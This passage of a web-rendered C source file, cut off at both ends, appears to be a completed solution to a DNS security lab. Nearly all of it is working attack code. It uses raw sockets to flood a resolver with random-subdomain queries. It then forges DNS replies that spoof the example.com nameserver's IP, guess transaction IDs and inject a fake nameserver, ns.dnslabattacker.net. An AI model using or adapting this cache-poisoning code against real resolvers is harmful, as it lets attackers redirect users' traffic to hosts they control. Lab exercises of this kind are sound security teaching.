class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div><div class="line">336</div><div class="line">337</div><div class="line">338</div><div class="line">339</div><div class="line">340</div><div class="line">341</div><div class="line">342</div><div class="line">343</div><div class="line">344</div><div class="line">345</div><div class="line">346</div><div class="line">347</div><div class="line">348</div><div class="line">349</div><div class="line">350</div><div class="line">351</div><div class="line">352</div><div class="line">353</div><div class="line">354</div><div class="line">355</div><div class="line">356</div><div class="line">357</div><div class="line">358</div><div class="line">359</div><div class="line">360</div><div class="line">361</div><div class="line">362</div><div class="line">363</div><div class="line">364</div><div class="line">365</div><div class="line">366</div><div class="line">367</div><div class="line">368</div><div class="line">369</div><div class="line">370</div><div class="line">371</div><div class="line">372</div><div class="line">373</div><div class="line">374</div><div class="line">375</div><div class="line">376</div><div class="line">377</div><div class="line">378</div><div class="line">379</div><div class="line">380</div><div class="line">381</div><div class="line">382</div><div class="line">383</div><div class="line">384</div><div class="line">385</div><div class="line">386</div><div class="line">387</div><div class="line">388</div><div class="line">389</div><div class="line">390</div><div class="line">391</div><div class="line">392</div><div class="line">393</div><div class="line">394</div><div class="line">395</div><div class="line">396</div><div class="line">397</div><div class="line">398</div><div class="line">399</div><div class="line">400</div><div class="line">401</div><div class="line">402</div><div class="line">403</div><div class="line">404</div><div class="line">405</div><div class="line">406</div><div class="line">407</div><div class="line">408</div><div class="line">409</div><div class="line">410</div><div class="line">411</div><div class="line">412</div><div class="line">413</div><div class="line">414</div><div class="line">415</div><div class="line">416</div><div class="line">417</div><div class="line">418</div><div class="line">419</div><div class="line">420</div><div class="line">421</div><div class="line">422</div><div class="line">423</div><div class="line">424</div><div class="line">425</div><div class="line">426</div><div class="line">427</div><div class="line">428</div><div class="line">429</div><div class="line">430</div><div class="line">431</div><div class="line">432</div><div class="line">433</div><div class="line">434</div><div class="line">435</div><div class="line">436</div><div class="line">437</div><div class="line">438</div><div class="line">439</div><div class="line">440</div><div class="line">441</div><div class="line">442</div><div class="line">443</div><div class="line">444</div><div class="line">445</div><div class="line">446</div><div class="line">447</div><div class="line">448</div><div class="line">449</div><div class="line">450</div><div class="line">451</div><div class="line">452</div><div class="line">453</div><div class="line">454</div><div class="line">455</div><div class="line">456</div><div class="line">457</div><div class="line">458</div><div class="line">459</div><div class="line">460</div><div class="line">461</div><div class="line">462</div><div class="line">463</div><div class="line">464</div><div class="line">465</div><div class="line">466</div><div class="line">467</div><div class="line">468</div><div class="line">469</div><div class="line">470</div><div class="line">471</div><div class="line">472</div><div class="line">473</div><div class="line">474</div><div class="line">475</div><div class="line">476</div><div class="line">477</div><div class="line">478</div><div class="line">479</div><div class="line">480</div><div class="line">481</div><div class="line">482</div><div class="line">483</div><div class="line">484</div><div class="line">485</div><div class="line">486</div><div class="line">487</div><div class="line">488</div><div class="line">489</div><div class="line">490</div><div class="line">491</div><div class="line">492</div><div class="line">493</div><div class="line">494</div><div class="line">495</div><div class="line">496</div><div class="line">497</div><div class="line">498</div><div class="line">499</div><div class="line">500</div><div class="line">501</div><div class="line">502</div><div class="line">503</div><div class="line">504</div><div class="line">505</div><div class="line">506</div><div class="line">507</div><div class="line">508</div><div class="line">509</div><div class="line">510</div><div class="line">511</div><div class="line">512</div><div class="line">513</div><div class="line">514</div><div class="line">515</div><div class="line">516</div><div class="line">517</div><div class="line">518</div><div class="line">519</div><div class="line">520</div><div class="line">521</div><div class="line">522</div><div class="line">523</div><div class="line">524</div><div class="line">525</div><div class="line">526</div><div class="line">527</div><div class="line">528</div><div class="line">529</div><div class="line">530</div><div class="line">531</div><div class="line">532</div><div class="line">533</div><div class="line">534</div><div class="line">535</div><div class="line">536</div><div class="line">537</div><div class="line">538</div><div class="line">539</div><div class="line">540</div><div class="line">541</div><div class="line">542</div><div class="line">543</div><div class="line">544</div><div class="line">545</div><div class="line">546</div><div class="line">547</div><div class="line">548</div><div class="line">549</div><div class="line">550</div><div class="line">551</div><div class="line">552</div><div class="line">553</div><div class="line">554</div><div class="line">555</div><div class="line">556</div><div class="line">557</div><div class="line">558</div><div class="line">559</div><div class="line">560</div><div class="line">561</div><div class="line">562</div><div class="line">563</div><div class="line">564</div><div class="line">565</div><div class="line">566</div><div class="line">567</div><div class="line">568</div><div class="line">569</div><div class="line">570</div><div class="line">571</div><div class="line">572</div><div class="line">573</div><div class="line">574</div><div class="line">575</div><div class="line">576</div><div class="line">577</div><div class="line">578</div><div class="line">579</div><div class="line">580</div><div class="line">581</div><div class="line">582</div><div class="line">583</div><div class="line">584</div><div class="line">585</div><div class="line">586</div><div class="line">587</div><div class="line">588</div><div class="line">589</div><div class="line">590</div><div class="line">591</div><div class="line">592</div><div class="line">593</div><div class="line">594</div><div class="line">595</div><div class="line">596</div><div class="line">597</div><div class="line">598</div><div class="line">599</div><div class="line">600</div><div class="line">601</div><div class="line">602</div><div class="line">603</div><div class="line">604</div><div class="line">605</div><div class="line">606</div><div class="line">607</div><div class="line">608</div><div class="line">609</div><div class="line">610</div><div class="line">611</div><div class="line">612</div><div class="line">613</div><div class="line">614</div><div class="line">615</div><div class="line">616</div><div class="line">617</div><div class="line">618</div><div class="line">619</div><div class="line">620</div><div class="line">621</div><div class="line">622</div><div class="line">623</div><div class="line">624</div><div class="line">625</div><div class="line">626</div><div class="line">627</div><div class="line">628</div><div class="line">629</div><div class="line">630</div><div class="line">631</div><div class="line">632</div><div class="line">633</div><div class="line">634</div></pre></td><td class="code"><pre><div class="line"> // ----udp.c------</div><div class="line">// This sample program must be run by root lol! </div><div class="line">// </div><div class="line">// The program is to spoofing tons of different queries to the victim.</div><div class="line">// Use wireshark to study the packets. However, it is not enough for </div><div class="line">// the lab, please finish the response packet and complete the task.</div><div class="line">//</div><div class="line">// Compile command:</div><div class="line">// gcc -lpcap udp.c -o udp</div><div class="line">//</div><div class="line">// </div><div class="line"></div><div class="line">    #include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">    #include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">    #include &lt;sys/socket.h&gt;</div><div class="line"></div><div class="line">    #include &lt;netinet/ip.h&gt;</div><div class="line"></div><div class="line">    #include &lt;netinet/udp.h&gt;</div><div class="line">    #include &lt;fcntl.h&gt;</div><div class="line">    #include &lt;string.h&gt;</div><div class="line">    #include &lt;errno.h&gt;</div><div class="line">    #include &lt;stdlib.h&gt;</div><div class="line">#include &lt;libnet.h&gt;</div><div class="line">    // The packet length</div><div class="line"></div><div class="line">    #define PCKT_LEN 8192</div><div class="line">    #define FLAG_R 0x8400</div><div class="line">    #define FLAG_Q 0x0100</div><div class="line">     </div><div class="line"></div><div class="line"></div><div class="line">    // Can create separate header file (.h) for all headers&apos; structure</div><div class="line"></div><div class="line">    // The IP header&apos;s structure</div><div class="line"></div><div class="line">    struct ipheader &#123;</div><div class="line"></div><div class="line">     unsigned char      iph_ihl:4, iph_ver:4;</div><div class="line"></div><div class="line">     unsigned char      iph_tos;</div><div class="line"></div><div class="line">     unsigned short int iph_len;</div><div class="line"></div><div class="line">     unsigned short int iph_ident;</div><div class="line"></div><div class="line"> //    unsigned char      iph_flag;</div><div class="line"></div><div class="line">     unsigned short int iph_offset;</div><div class="line"></div><div class="line">     unsigned char      iph_ttl;</div><div class="line"></div><div class="line">     unsigned char      iph_protocol;</div><div class="line"></div><div class="line">     unsigned short int iph_chksum;</div><div class="line"></div><div class="line">     unsigned int       iph_sourceip;</div><div class="line"></div><div class="line">     unsigned int       iph_destip;</div><div class="line"></div><div class="line">    &#125;;</div><div class="line"></div><div class="line">     </div><div class="line"></div><div class="line">    // UDP header&apos;s structure</div><div class="line"></div><div class="line">    struct udpheader &#123;</div><div class="line"></div><div class="line">     unsigned short int udph_srcport;</div><div class="line"></div><div class="line">     unsigned short int udph_destport;</div><div class="line"></div><div class="line">     unsigned short int udph_len;</div><div class="line"></div><div class="line">     unsigned short int udph_chksum;</div><div class="line"></div><div class="line">    &#125;;</div><div class="line">    struct dnsheader &#123;</div><div class="line">	unsigned short int query_id;</div><div class="line">	unsigned short int flags;</div><div class="line">	unsigned short int QDCOUNT;</div><div class="line">	unsigned short int ANCOUNT;</div><div class="line">	unsigned short int NSCOUNT;</div><div class="line">	unsigned short int ARCOUNT;</div><div class="line">&#125;;</div><div class="line">// This structure just for convinience in the DNS packet, because such 4 byte data often appears. </div><div class="line">    struct dataEnd&#123;</div><div class="line">	unsigned short int  type;</div><div class="line">	unsigned short int  class;</div><div class="line">&#125;;</div><div class="line">    // total udp header length: 8 bytes (=64 bits)</div><div class="line">// structure to hold the answer end section</div><div class="line">struct ansEnd&#123;</div><div class="line">	//char* name;</div><div class="line">	unsigned short int type;</div><div class="line">	//char* type;</div><div class="line">	unsigned short int class;</div><div class="line">	//char* class;</div><div class="line">	//unsigned int ttl;</div><div class="line">	unsigned short int ttl_l;</div><div class="line">	unsigned short int ttl_h;</div><div class="line">	unsigned short int datalen;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">// structure to hold the authorative nameserver end section</div><div class="line">struct nsEnd&#123;</div><div class="line">	//char* name;</div><div class="line">	unsigned short int type;</div><div class="line">	unsigned short int class;</div><div class="line">	//unsigned int ttl;</div><div class="line">	unsigned short int ttl_l;</div><div class="line">	unsigned short int ttl_h;</div><div class="line">	unsigned short int datalen;</div><div class="line">	//unsigned int ns;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">unsigned int checksum(uint16_t *usBuff, int isize)</div><div class="line">&#123;</div><div class="line">	unsigned int cksum=0;</div><div class="line">	for(;isize&gt;1;isize-=2)&#123;</div><div class="line">	cksum+=*usBuff++;</div><div class="line">       &#125;</div><div class="line">	if(isize==1)&#123;</div><div class="line">	 cksum+=*(uint16_t *)usBuff;</div><div class="line">        &#125;</div><div class="line"></div><div class="line"></div><div class="line">	return (cksum);</div><div class="line">&#125;</div><div class="line"></div><div class="line">// calculate udp checksum</div><div class="line">uint16_t check_udp_sum(uint8_t *buffer, int len)</div><div class="line">&#123;</div><div class="line">        unsigned long sum=0;</div><div class="line">	struct ipheader *tempI=(struct ipheader *)(buffer);</div><div class="line">	struct udpheader *tempH=(struct udpheader *)(buffer+sizeof(struct ipheader));</div><div class="line">	struct dnsheader *tempD=(struct dnsheader *)(buffer+sizeof(struct ipheader)+sizeof(struct udpheader));</div><div class="line">	tempH-&gt;udph_chksum=0;</div><div class="line">	sum=checksum( (uint16_t *)   &amp;(tempI-&gt;iph_sourceip) ,8 );</div><div class="line">	sum+=checksum((uint16_t *) tempH,len);</div><div class="line"></div><div class="line">	sum+=ntohs(IPPROTO_UDP+len);</div><div class="line">	</div><div class="line"></div><div class="line">	sum=(sum&gt;&gt;16)+(sum &amp; 0x0000ffff);</div><div class="line">	sum+=(sum&gt;&gt;16);</div><div class="line"></div><div class="line">	return (uint16_t)(~sum);</div><div class="line">	</div><div class="line">&#125;</div><div class="line">    // Function for checksum calculation. From the RFC,</div><div class="line"></div><div class="line">    // the checksum algorithm is:</div><div class="line"></div><div class="line">    //  &quot;The checksum field is the 16 bit one&apos;s complement of the one&apos;s</div><div class="line"></div><div class="line">    //  complement sum of all 16 bit words in the header.  For purposes of</div><div class="line"></div><div class="line">    //  computing the checksum, the value of the checksum field is zero.&quot;</div><div class="line"></div><div class="line">    unsigned short csum(unsigned short *buf, int nwords)</div><div class="line"></div><div class="line">    &#123;       //</div><div class="line"></div><div class="line">            unsigned long sum;</div><div class="line"></div><div class="line">            for(sum=0; nwords&gt;0; nwords--)</div><div class="line"></div><div class="line">                    sum += *buf++;</div><div class="line"></div><div class="line">            sum = (sum &gt;&gt; 16) + (sum &amp;0xffff);</div><div class="line"></div><div class="line">            sum += (sum &gt;&gt; 16);</div><div class="line"></div><div class="line">            return (unsigned short)(~sum);</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">//构造的回复包</div><div class="line">int response(char* request_url, char* src_addr, char* dest_addr)</div><div class="line">&#123;</div><div class="line"></div><div class="line">// socket号</div><div class="line">    int sd;</div><div class="line"></div><div class="line">// 包的buffer</div><div class="line">    char buffer[PCKT_LEN];</div><div class="line"></div><div class="line">// 将buffer初始化为0</div><div class="line">    memset(buffer, 0, PCKT_LEN);</div><div class="line"></div><div class="line">    // 初始化包头地址</div><div class="line">    struct ipheader *ip = (struct ipheader *) buffer;</div><div class="line">    struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));</div><div class="line">    struct dnsheader *dns=(struct dnsheader*) (buffer +sizeof(struct ipheader)+sizeof(struct udpheader));</div><div class="line"></div><div class="line">// data内容的指针  </div><div class="line">    char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));</div><div class="line">//dns的flag位</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">///////////////////////////构造dns包////////////////////////////////////</div><div class="line">	dns-&gt;flags=htons(FLAG_R);</div><div class="line">	dns-&gt;QDCOUNT=htons(1);</div><div class="line">	dns-&gt;ANCOUNT=htons(1);</div><div class="line">	dns-&gt;NSCOUNT=htons(1);</div><div class="line">        dns-&gt;ARCOUNT = htons(1);</div><div class="line"></div><div class="line"></div><div class="line">//查询的内容</div><div class="line">    strcpy(data,request_url);</div><div class="line">    int length= strlen(data)+1;</div><div class="line"></div><div class="line">	</div><div class="line">    struct dataEnd * end=(struct dataEnd *)(data+length);</div><div class="line">    end-&gt;type=htons(1);</div><div class="line">    end-&gt;class=htons(1);</div><div class="line"></div><div class="line">	//回复的内容</div><div class="line"> char *ans=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader)+sizeof(struct dataEnd)+length);</div><div class="line"></div><div class="line">    strcpy(ans,request_url);</div><div class="line">    int anslength= strlen(ans)+1;</div><div class="line"></div><div class="line">    struct ansEnd * ansend=(struct ansEnd *)(ans+anslength);</div><div class="line">    ansend-&gt;type = htons(1);</div><div class="line">    ansend-&gt;class=htons(1);</div><div class="line">    ansend-&gt;ttl_l=htons(0x00);</div><div class="line">    ansend-&gt;ttl_h=htons(0xFFFF);  //tll,即有效的时间</div><div class="line">    ansend-&gt;datalen=htons(4);    //回复的内容的长度</div><div class="line"></div><div class="line">    char *ansaddr=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader)+sizeof(struct dataEnd)+length+sizeof(struct ansEnd)+anslength);</div><div class="line"></div><div class="line">    strcpy(ansaddr,&quot;\1\2\3\4&quot;);</div><div class="line">    int addrlen = strlen(ansaddr);</div><div class="line"></div><div class="line">//ns域名服务器</div><div class="line">    char *ns =(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader)+sizeof(struct dataEnd)+length+sizeof(struct ansEnd)+anslength+addrlen);</div><div class="line">    strcpy(ns,&quot;\7example\3com&quot;);</div><div class="line">    int nslength= strlen(ns)+1;</div><div class="line"></div><div class="line">    struct nsEnd * nsend=(struct nsEnd *)(ns+nslength);</div><div class="line">    nsend-&gt;type=htons(2);</div><div class="line">    nsend-&gt;class=htons(1);</div><div class="line">    nsend-&gt;ttl_l=htons(0x00);</div><div class="line">    nsend-&gt;ttl_h=htons(0xFFFF);   //tll,即有效的时间</div><div class="line">	//数据的长度，为nsname的长度+1</div><div class="line">    nsend-&gt;datalen=htons(23);  </div><div class="line">     </div><div class="line">    char *nsname=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader)+sizeof(struct dataEnd)+length+sizeof(struct ansEnd)+anslength+addrlen+sizeof(struct nsEnd)+nslength);</div><div class="line"></div><div class="line">	//伪造的域名服务器</div><div class="line">    strcpy(nsname,&quot;\2ns\16dnslabattacker\3net&quot;);</div><div class="line">    int nsnamelen = strlen(nsname)+1;</div><div class="line"></div><div class="line">//额外的信息</div><div class="line"> char *ar=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader)+sizeof(struct dataEnd)+length+sizeof(struct ansEnd)+anslength+addrlen+sizeof(struct nsEnd)+nslength+nsnamelen);</div><div class="line">    strcpy(ar,&quot;\2ns\16dnslabattacker\3net&quot;);</div><div class="line">    int arlength = strlen(ar)+1;</div><div class="line">    struct ansEnd* arend = (struct ansEnd*)(ar + arlength);</div><div class="line">    arend-&gt;type = htons(1);</div><div class="line">    arend-&gt;class=htons(1);</div><div class="line">    arend-&gt;ttl_l=htons(0x00);</div><div class="line">    arend-&gt;ttl_h=htons(0xFFFF);</div><div class="line">    arend-&gt;datalen=htons(4);</div><div class="line">    char *araddr=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader)+sizeof(struct dataEnd)+length+sizeof(struct ansEnd)+anslength+addrlen+sizeof(struct nsEnd)+nslength+nsnamelen+arlength+sizeof(struct ansEnd));</div><div class="line"></div><div class="line">    strcpy(araddr,&quot;\1\2\3\4&quot;);</div><div class="line">    int araddrlen = strlen(araddr);</div><div class="line"></div><div class="line">/////////////////////dns包的构造到此完毕///////////////////////////////</div><div class="line"></div><div class="line">    //构造ip包</div><div class="line"></div><div class="line">    struct sockaddr_in sin, din;</div><div class="line"></div><div class="line">    int one = 1;</div><div class="line"></div><div class="line">    const int *val = &amp;one;</div><div class="line"></div><div class="line">    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);</div><div class="line"></div><div class="line"></div><div class="line">if(sd&lt;0 ) </div><div class="line">printf(&quot;socket error\n&quot;);</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">    sin.sin_family = AF_INET;</div><div class="line"></div><div class="line">    din.sin_family = AF_INET;</div><div class="line"></div><div class="line">    //端口号</div><div class="line"></div><div class="line">    sin.sin_port = htons(33333);</div><div class="line"></div><div class="line">    din.sin_port = htons(53);</div><div class="line"></div><div class="line">    //IP地址</div><div class="line"></div><div class="line">    sin.sin_addr.s_addr = inet_addr(src_addr); </div><div class="line"></div><div class="line">    din.sin_addr.s_addr = inet_addr(&quot;199.43.133.53&quot;); //example.com的域名服务器的地址，可通过抓包获得</div><div class="line"></div><div class="line"></div><div class="line">    ip-&gt;iph_ihl = 5;</div><div class="line"></div><div class="line"></div><div class="line">    ip-&gt;iph_ver = 4;</div><div class="line"></div><div class="line"></div><div class="line">    ip-&gt;iph_tos = 0;</div><div class="line"></div><div class="line"></div><div class="line">   unsigned short int packetLength =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)+anslength+sizeof( struct ansEnd)+nslength+sizeof(struct nsEnd)+addrlen+nsnamelen+arlength+sizeof(struct ansEnd)+araddrlen); // length + dataEnd_size == UDP_payload_size</div><div class="line"></div><div class="line">     ip-&gt;iph_len=htons(packetLength);</div><div class="line"></div><div class="line">    ip-&gt;iph_ident = htons(rand());</div><div class="line"></div><div class="line"></div><div class="line">    ip-&gt;iph_ttl = 110; </div><div class="line"></div><div class="line">    ip-&gt;iph_protocol = 17; // UDP</div><div class="line"></div><div class="line">    //该地值需要抓包确定</div><div class="line"></div><div class="line">    ip-&gt;iph_sourceip = inet_addr(&quot;199.43.133.53&quot;);</div><div class="line"></div><div class="line">    // The destination IP address</div><div class="line"></div><div class="line">    ip-&gt;iph_destip = inet_addr(src_addr);</div><div class="line"></div><div class="line">     </div><div class="line"></div><div class="line">    // Fabricate the UDP header. Source port number, redundant</div><div class="line"></div><div class="line">    udp-&gt;udph_srcport = htons(53);  // source port number, I make them random... remember the lower number may be reserved</div><div class="line"></div><div class="line">    // Destination port number</div><div class="line"></div><div class="line">    udp-&gt;udph_destport = htons(33333);</div><div class="line"></div><div class="line"></div><div class="line">   udp-&gt;udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)+anslength+sizeof( struct ansEnd)+nslength+sizeof(struct nsEnd)+addrlen+nsnamelen+arlength+sizeof(struct ansEnd)+araddrlen); // udp_header_size + udp_payload_size</div><div class="line"></div><div class="line">    // Calculate the checksum for integrity//</div><div class="line"></div><div class="line">    ip-&gt;iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));</div><div class="line"> </div><div class="line"></div><div class="line">    udp-&gt;udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));</div><div class="line"></div><div class="line"></div><div class="line">    // Inform the kernel do not fill up the packet structure. we will build our own...</div><div class="line"> if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))&lt;0 )</div><div class="line">&#123;</div><div class="line">	printf(&quot;error\n&quot;);	</div><div class="line">	exit(-1);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">int count = 0;</div><div class="line">int trans_id = 3000;</div><div class="line">while(count &lt; 100)&#123;	</div><div class="line"></div><div class="line"></div><div class="line">// This is to generate different query in xxxxx.example.edu</div><div class="line">/*	int charnumber;</div><div class="line">	charnumber=1+rand()%5;</div><div class="line">	*(data+charnumber)+=1;</div><div class="line">*/</div><div class="line">	//dns-&gt;query_id=rand();</div><div class="line">	dns-&gt;query_id=trans_id+count;</div><div class="line">	udp-&gt;udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); </div><div class="line">// recalculate the checksum for the UDP packet</div><div class="line"></div><div class="line">	// send the packet out.</div><div class="line">    	if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&amp;sin, sizeof(sin)) &lt; 0)</div><div class="line">		printf(&quot;packet send error %d which means %s\n&quot;,errno,strerror(errno));</div><div class="line">	count++;</div><div class="line">	&#125;</div><div class="line">close(sd);</div><div class="line"></div><div class="line">return 0;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">    </div><div class="line"></div><div class="line">int main(int argc, char *argv[])</div><div class="line">&#123;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">// This is to check the argc number</div><div class="line">    if(argc != 3)&#123;</div><div class="line"></div><div class="line">    	printf(&quot;- Invalid parameters!!!\nPlease enter 2 ip addresses\nFrom first to last:src_IP  dest_IP  \n&quot;);</div><div class="line">   </div><div class="line">    	exit(-1);</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">// socket descriptor</div><div class="line">    int sd;</div><div class="line"></div><div class="line">// buffer to hold the packet</div><div class="line">    char buffer[PCKT_LEN];</div><div class="line"></div><div class="line">// set the buffer to 0 for all bytes</div><div class="line">    memset(buffer, 0, PCKT_LEN);</div><div class="line"></div><div class="line">    // Our own headers&apos; structures</div><div class="line"></div><div class="line">    struct ipheader *ip = (struct ipheader *) buffer;</div><div class="line"></div><div class="line"></div><div class="line">    struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));</div><div class="line"></div><div class="line"></div><div class="line">    struct dnsheader *dns=(struct dnsheader*) (buffer +sizeof(struct ipheader)+sizeof(struct udpheader));</div><div class="line"></div><div class="line">// data is the pointer points to the first byte of the dns payload  </div><div class="line">    char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">////////////////////////////////////////////////////////////////////////</div><div class="line">// dns fields(UDP payload field)</div><div class="line">// relate to the lab, you can change them. begin:</div><div class="line">////////////////////////////////////////////////////////////////////////</div><div class="line"></div><div class="line">//The flag you need to set</div><div class="line"></div><div class="line">	dns-&gt;flags=htons(FLAG_Q);</div><div class="line">//only 1 query, so the count should be one.</div><div class="line">	dns-&gt;QDCOUNT=htons(1);</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">//query string</div><div class="line">    strcpy(data,&quot;\5abcde\7example\3com&quot;);</div><div class="line">    int length= strlen(data)+1;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">//this is for convinience to get the struct type write the 4bytes in a more organized way.</div><div class="line"></div><div class="line">    struct dataEnd * end=(struct dataEnd *)(data+length);</div><div class="line">    end-&gt;type=htons(1);</div><div class="line">    end-&gt;class=htons(1);</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">/////////////////////////////////////////////////////////////////////</div><div class="line">//</div><div class="line">// DNS format, relate to the lab, you need to change them, end</div><div class="line">//</div><div class="line">//////////////////////////////////////////////////////////////////////</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">/*************************************************************************************</div><div class="line">Construction of the packet is done. </div><div class="line">now focus on how to do the settings and send the packet we have composed out</div><div class="line">***************************************************************************************/</div><div class="line">    // Source and destination addresses: IP and port</div><div class="line"></div><div class="line">    struct sockaddr_in sin, din;</div><div class="line"></div><div class="line">    int one = 1;</div><div class="line"></div><div class="line">    const int *val = &amp;one;</div><div class="line"></div><div class="line">     dns-&gt;query_id=rand(); // transaction ID for the query packet, use random #</div><div class="line"></div><div class="line"></div><div class="line">     </div><div class="line"></div><div class="line">    // Create a raw socket with UDP protocol</div><div class="line"></div><div class="line">    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);</div><div class="line"></div><div class="line"></div><div class="line">if(sd&lt;0 ) // if socket fails to be created </div><div class="line">printf(&quot;socket error\n&quot;);</div><div class="line"></div><div class="line"></div><div class="line">    // The source is redundant, may be used later if needed</div><div class="line"></div><div class="line">    // The address family</div><div class="line"></div><div class="line">    sin.sin_family = AF_INET;</div><div class="line"></div><div class="line">    din.sin_family = AF_INET;</div><div class="line"></div><div class="line">    // Port numbers</div><div class="line"></div><div class="line">    sin.sin_port = htons(33333);</div><div class="line"></div><div class="line">    din.sin_port = htons(53);</div><div class="line"></div><div class="line">    // IP addresses</div><div class="line"></div><div class="line">    sin.sin_addr.s_addr = inet_addr(argv[2]); // this is the second argument we input into the program</div><div class="line"></div><div class="line">    din.sin_addr.s_addr = inet_addr(argv[1]); // this is the first argument we input into the program</div><div class="line"></div><div class="line">     </div><div class="line"></div><div class="line">    // Fabricate the IP header or we can use the</div><div class="line"></div><div class="line">    // standard header structures but assign our own values.</div><div class="line"></div><div class="line">    ip-&gt;iph_ihl = 5;</div><div class="line"></div><div class="line"></div><div class="line">    ip-&gt;iph_ver = 4;</div><div class="line"></div><div class="line"></div><div class="line">    ip-&gt;iph_tos = 0; // Low delay</div><div class="line"></div><div class="line"></div><div class="line">    unsigned short int packetLength =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)); // length + dataEnd_size == UDP_payload_size</div><div class="line"></div><div class="line">     ip-&gt;iph_len=htons(packetLength);</div><div class="line"></div><div class="line">    ip-&gt;iph_ident = htons(rand()); // we give a random number for the identification#</div><div class="line"></div><div class="line"></div><div class="line">    ip-&gt;iph_ttl = 110; // hops</div><div class="line"></div><div class="line">    ip-&gt;iph_protocol = 17; // UDP</div><div class="line"></div><div class="line">    // Source IP address, can use spoofed address here!!!</div><div class="line"></div><div class="line">    ip-&gt;iph_sourceip = inet_addr(argv[1]);</div><div class="line"></div><div class="line">    // The destination IP address</div><div class="line"></div><div class="line">    ip-&gt;iph_destip = inet_addr(argv[2]);</div><div class="line"></div><div class="line">     </div><div class="line"></div><div class="line">    // Fabricate the UDP header. Source port number, redundant</div><div class="line"></div><div class="line">    udp-&gt;udph_srcport = htons(33333);  // source port number, I make them random... remember the lower number may be reserved</div><div class="line"></div><div class="line">    // Destination port number</div><div class="line"></div><div class="line">    udp-&gt;udph_destport = htons(53);</div><div class="line"></div><div class="line"></div><div class="line">    udp-&gt;udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)); // udp_header_size + udp_payload_size</div><div class="line"></div><div class="line">    // Calculate the checksum for integrity//</div><div class="line"></div><div class="line">    ip-&gt;iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));</div><div class="line"> </div><div class="line"></div><div class="line">    udp-&gt;udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));</div><div class="line">/*******************************************************************************8</div><div class="line">Tips</div><div class="line"></div><div class="line">the checksum is quite important to pass the checking integrity. You need </div><div class="line">to study the algorithem and what part should be taken into the calculation.</div><div class="line"></div><div class="line">!!!!!If you change anything related to the calculation of the checksum, you need to re-</div><div class="line">calculate it or the packet will be dropped.!!!!!</div><div class="line"></div><div class="line">Here things became easier since I wrote the checksum function for you. You don&apos;t need</div><div class="line">to spend your time writing the right checksum function.</div><div class="line">Just for knowledge purpose,</div><div class="line">remember the seconed parameter</div><div class="line">for UDP checksum:</div><div class="line">ipheader_size + udpheader_size + udpData_size  </div><div class="line">for IP checksum: </div><div class="line">ipheader_size + udpheader_size</div><div class="line">*********************************************************************************/</div><div class="line"></div><div class="line">    // Inform the kernel do not fill up the packet structure. we will build our own...</div><div class="line"> if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))&lt;0 )</div><div class="line">&#123;</div><div class="line">	printf(&quot;error\n&quot;);	</div><div class="line">	exit(-1);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">while(1)&#123;	</div><div class="line"></div><div class="line"></div><div class="line">// This is to generate different query in xxxxx.example.edu</div><div class="line">	int charnumber;</div><div class="line">	charnumber=1+rand()%5;</div><div class="line">	*(data+charnumber)+=1;</div><div class="line"></div><div class="line">	udp-&gt;udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet</div><div class="line"></div><div class="line">	// send the packet out.</div><div class="line">    	if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&amp;sin, sizeof(sin)) &lt; 0)</div><div class="line">		